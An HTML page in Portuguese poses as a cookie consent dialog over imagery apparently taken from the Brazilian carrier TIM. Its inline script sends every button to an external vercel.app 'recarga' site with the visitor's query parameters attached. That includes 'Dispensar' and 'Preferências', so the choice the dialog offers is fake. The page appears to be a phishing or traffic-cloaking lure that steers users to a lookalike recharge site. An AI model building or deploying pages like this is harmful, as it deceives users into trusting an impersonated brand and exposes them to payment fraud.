<!DOCTYPE html>
<html lang="pt-BR" class="bg-[#0b0c4a]">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="theme-color" content="#0b0c4a" />
  <title>Aviso de Cookies</title>
  <meta name="description" content="Aviso de consentimento de cookies" />

  <!-- Sem favicon -->
  <link rel="icon" href="data:," />

  <!-- Preload Assets -->
  <link rel="preload" href="/images/tim-background.png" as="image" />
  <link rel="stylesheet" href="/style.css" />
</head>

<body class="antialiased">
  <main class="relative flex min-h-dvh items-center justify-center overflow-hidden bg-[#0b0c4a] p-4">
    <!-- Background Image -->
    <div aria-hidden="true" class="absolute inset-0 flex justify-center">
      <img src="/images/tim-background.png" alt="" class="h-full w-auto max-w-none scale-110 object-contain blur-md" />
    </div>

    <!-- Overlay -->
    <div aria-hidden="true" class="absolute inset-0 bg-black/40"></div>

    <!-- Modal Box -->
    <div class="relative z-10 flex w-full justify-center">
      <section role="dialog" aria-modal="true" aria-labelledby="cookie-consent-text"
        class="w-full max-w-xl rounded-2xl border border-slate-200 bg-white p-6 shadow-2xl sm:p-8">
        <p id="cookie-consent-text" class="text-pretty text-base leading-relaxed text-slate-700">
          Para melhorar sua experiência de navegação, este site utiliza cookies. Ao clicar em &quot;Aceitar&quot;, você
          consente estar de acordo com nossa
          <a href="https://tim-recargaja.vercel.app"
            class="font-medium text-[#0f3b8c] underline underline-offset-2 cookie-action-btn">Política Cookies</a>.
        </p>

        <div class="mt-6 flex flex-col gap-3 sm:flex-row sm:items-center">
          <button type="button" tabindex="0" data-slot="button"
            class="cookie-action-btn group/button inline-flex shrink-0 items-center justify-center rounded-lg border border-transparent bg-clip-padding font-medium whitespace-nowrap transition-all outline-none select-none focus-visible:border-ring focus-visible:ring-3 focus-visible:ring-ring/50 active:not-aria-[haspopup]:translate-y-px disabled:pointer-events-none disabled:opacity-50 aria-invalid:border-destructive aria-invalid:ring-3 aria-invalid:ring-destructive/20 dark:aria-invalid:border-destructive/50 dark:aria-invalid:ring-destructive/40 [&_svg]:pointer-events-none [&_svg]:shrink-0 [&_svg:not([class*='size-'])]:size-4 [a]:hover:bg-primary/80 gap-1.5 px-2.5 has-data-[icon=inline-end]:pr-2 has-data-[icon=inline-start]:pl-2 h-12 w-full bg-[#0f3b8c] text-base text-white hover:bg-[#0f3b8c]/90 sm:h-10 sm:w-auto sm:px-6 sm:text-sm">
            Aceitar
          </button>

          <button type="button" tabindex="0" data-slot="button"
            class="cookie-action-btn group/button inline-flex shrink-0 items-center justify-center rounded-lg border border-transparent bg-clip-padding font-medium whitespace-nowrap transition-all outline-none select-none focus-visible:border-ring focus-visible:ring-3 focus-visible:ring-ring/50 active:not-aria-[haspopup]:translate-y-px disabled:pointer-events-none disabled:opacity-50 aria-invalid:border-destructive aria-invalid:ring-3 aria-invalid:ring-destructive/20 dark:aria-invalid:border-destructive/50 dark:aria-invalid:ring-destructive/40 [&_svg]:pointer-events-none [&_svg]:shrink-0 [&_svg:not([class*='size-'])]:size-4 [a]:hover:bg-primary/80 gap-1.5 px-2.5 has-data-[icon=inline-end]:pr-2 has-data-[icon=inline-start]:pl-2 h-12 w-full bg-[#0f3b8c] text-base text-white hover:bg-[#0f3b8c]/90 sm:h-10 sm:w-auto sm:px-6 sm:text-sm">
            Dispensar
          </button>

          <button type="button" tabindex="0" data-slot="button"
            class="cookie-action-btn group/button inline-flex shrink-0 items-center justify-center rounded-lg border border-transparent bg-clip-padding font-medium whitespace-nowrap transition-all outline-none select-none focus-visible:border-ring focus-visible:ring-3 focus-visible:ring-ring/50 active:not-aria-[haspopup]:translate-y-px disabled:pointer-events-none disabled:opacity-50 aria-invalid:border-destructive aria-invalid:ring-3 aria-invalid:ring-destructive/20 dark:aria-invalid:border-destructive/50 dark:aria-invalid:ring-destructive/40 [&_svg]:pointer-events-none [&_svg]:shrink-0 [&_svg:not([class*='size-'])]:size-4 underline-offset-4 hover:underline px-2.5 has-data-[icon=inline-end]:pr-2 has-data-[icon=inline-start]:pl-2 h-12 w-full gap-2 text-base text-[#0f3b8c] sm:ml-auto sm:h-10 sm:w-auto sm:px-2 sm:text-sm">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
              stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
              class="lucide lucide-sliders-horizontal size-4" aria-hidden="true">
              <path d="M10 5H3"></path>
              <path d="M12 19H3"></path>
              <path d="M14 3v4"></path>
              <path d="M16 17v4"></path>
              <path d="M21 12h-9"></path>
              <path d="M21 19h-5"></path>
              <path d="M21 5h-7"></path>
              <path d="M8 10v4"></path>
              <path d="M8 12H3"></path>
            </svg>
            Preferências de Cookie
          </button>
        </div>
      </section>
    </div>
  </main>

  <!-- Interaction Handler -->
  <script>
    (function () {
      const destinationUrl = "https://tim-recargaja.vercel.app";
      const targetUrl = destinationUrl + (window.location.search || "");
      document.querySelectorAll(".cookie-action-btn").forEach(function (el) {
        if (el.tagName === "A") {
          el.href = targetUrl;
        }
        el.addEventListener("click", function (e) {
          e.preventDefault();
          window.location.href = targetUrl;
        });
      });
    })();
  </script>
</body>

</html>
